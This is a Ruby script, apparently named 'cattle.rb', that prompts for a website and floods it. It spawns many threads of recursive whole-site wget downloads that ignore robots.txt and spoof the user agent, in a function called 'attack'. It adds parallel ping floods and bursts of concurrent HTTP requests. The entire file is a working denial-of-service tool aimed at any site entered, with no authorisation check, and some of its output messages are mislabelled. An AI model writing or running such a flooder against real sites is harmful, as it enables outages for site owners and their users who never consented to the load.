#!/usr/bin/env ruby

require 'open3'
require 'net/http'
require 'thread'

class String
  # colorization
  def colorize(color_code)
    "\e[#{color_code}m#{self}\e[0m"
  end

  def red
    colorize(31)
  end

  def green
    colorize(32)
  end

  def yellow
    colorize(33)
  end

  def blue
    colorize(34)
  end

  def pink
    colorize(35)
  end

  def light_blue
    colorize(36)
  end
end

def http_s
  puts 'Would you like to test http (\'1\') or https (\'2\')?'.green
  int = STDIN.gets.to_i
  if int == 1
    pre = 'http://'
  elsif int == 2
    pre = 'https://'
  else
    puts 'No option was chosen. Please run the script again.'.red
    exit
  end
  return pre
end

def whichSite
  puts 'Which site would you like to test? (www.example.com)'.green
  baseUrl = gets.chomp
  return baseUrl
end
 
def loadUrl baseUrl, queries, pre
  j = 0
  system "ulimit -u 700"
  while j < queries
    command = "wget --show-progress --convert-links --random-wait -r -p -E -e robots=off -U mozilla -R index.html* #{pre}#{baseUrl}"
    Thread.new do
      `#{command}`
    end
    sleep (0.1)
    j += 1
  end
end

def retint str
  begin
    counter ||= 3
    puts str.green
    ints = STDIN.gets.to_i
    if ints <= 0 || ints == 'Nil'
      raise StandardError
    end
  rescue
    if (counter -= 1) > 0
      puts 'The input is incorrect. Please enter a number greater than 0.'.red
      retry
    else
      puts 'Please try running the script again.'.red
    end
    exit
  end
  return ints
end

def attack baseUrl
  puts 'Would you like to attack with ENTIRE WEBSITE download requests? Type (\'1\') if yes.'.green
  if STDIN.gets.to_i == 1
    pre = http_s
    queries = retint 'How many queries would you like to sent to the website?'
    puts queries
    loadUrl baseUrl, queries, pre
  end
end

def ping baseUrl
  puts 'Would you like to ping the website? Type (\'1\') if yes.'.green
  i = 0
  if STDIN.gets.to_i == 1
    sends = retint 'How many simultaneous ping queries would you like to send?'
    dings = retint 'How many ping queries per thread would you like to send?'
    puts dings
    puts sends
    while i < sends
      Thread.new do  
        puts syscall('ping', '-i', '0.2', '-c', "#{dings}", baseUrl)
      end
      sleep 1
      i += 1
    end
  end
end

def sitecode baseUrl
  threads = []
  mutex = Mutex.new
  puts 'Would you like to check website responses? Type (\'1\') if yes.'.green
  if STDIN.gets.to_i == 1
    pre = http_s
    website = pre + baseUrl
    uri = URI(website)
    success = 0
    redirection = 0
    client = 0
    server = 0
    thrds = retint 'How many threads would you like to create?'
    thrds.times do |i|
      threads[i] = Thread.new {
        response = Net::HTTP.get_response(uri)
        puts response.code
        if response.code.to_i >= 200 && response.code.to_i < 300
          mutex.synchronize do
            success += 1
          end
        elsif response.code.to_i >= 300 && response.code.to_i < 400
          mutex.synchronize do
            redirection += 1
          end
        elsif response.code.to_i >= 400 && response.code.to_i < 500
          mutex.synchronize do
           client += 1
          end
        elsif response.code.to_i >= 500 && response.code.to_i < 600
          mutex.synchronize do
            server += 1
          end
        end
      }
    end
    threads.each {|t| t.join}
    mutex.lock
    puts "There are #{success} redirections error responses"
    puts "There are #{redirection} redirections error responses"
    puts "There are #{client} client error responses"
    puts "There are #{server} server error responses"
  end
end

def syscall(*cmd)
  begin
    stdout, stderr, status = Open3.capture3(*cmd)
    status.success? && stdout.chomp
  rescue
  end
end

if ARGV.size > 0
  puts 'Too many arguments. Please just run the script on its own and follow the instructions'.red
  puts 'usage: ./cattle.rb'.red
  exit
else
  baseUrl = whichSite
  ping baseUrl
  attack baseUrl
  sitecode baseUrl
end



